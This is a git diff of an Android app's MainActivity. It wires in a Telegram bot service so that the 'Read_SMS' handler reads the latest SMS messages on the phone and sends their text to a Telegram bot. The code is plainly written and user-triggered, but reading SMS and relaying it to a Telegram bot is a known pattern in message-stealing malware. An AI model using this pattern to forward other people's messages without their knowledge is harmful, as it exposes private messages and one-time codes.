@@ -10,18 +10,13 @@ import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 
-import com.pengrad.telegrambot.TelegramBot;
-import com.pengrad.telegrambot.UpdatesListener;
-import com.pengrad.telegrambot.model.Update;
-import com.pengrad.telegrambot.request.SendMessage;
-import com.pengrad.telegrambot.response.SendResponse;
-
 public class MainActivity extends AppCompatActivity {
 
     private TextView textView;
     private Context context;
 
     private SmsService smsService;
+    private TelegramBotService telegramBotService;
 
 
     @Override
@@ -38,9 +33,8 @@ public class MainActivity extends AppCompatActivity {
         PhoneSmsService phoneSmsService = new PhoneSmsService(getContentResolver());
         smsService = new SmsService(phoneSmsService, smsFileService);
         RequestPermissions();
-
-
-
+        telegramBotService = new TelegramBotService(context);
+        telegramBotService.Init();
     }
 
     private void FileListing(Sms[] someSms){
@@ -55,7 +49,11 @@ public class MainActivity extends AppCompatActivity {
 
     public void Read_SMS(View view){
         Sms[] latestSms = smsService.GetAndStoreLatestSms();
-        FileListing(latestSms);
+
+        if(latestSms.length > 0){
+            FileListing(latestSms);
+            telegramBotService.SendMessage(GetText(latestSms));
+        }
     }
 
     private String GetText(Sms[] allSms){
